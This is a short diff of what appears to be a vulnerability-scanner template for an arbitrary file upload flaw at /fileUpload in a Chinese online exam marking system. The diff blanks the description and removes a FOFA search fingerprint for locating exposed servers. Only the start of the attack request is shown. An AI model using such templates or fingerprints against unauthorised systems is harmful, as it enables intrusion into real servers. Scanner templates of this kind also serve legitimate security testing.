@@ -3,12 +3,8 @@ info:
   name: 金航网上阅卷系统fileUpload任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cam5qsco5cnpng8y'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cam5qsco5cnpng8y
-    fofa: body="js/insteadSelect/jquery.insteadSelect.css"
 http:
 - raw:
   - 'POST /fileUpload HTTP/1.1
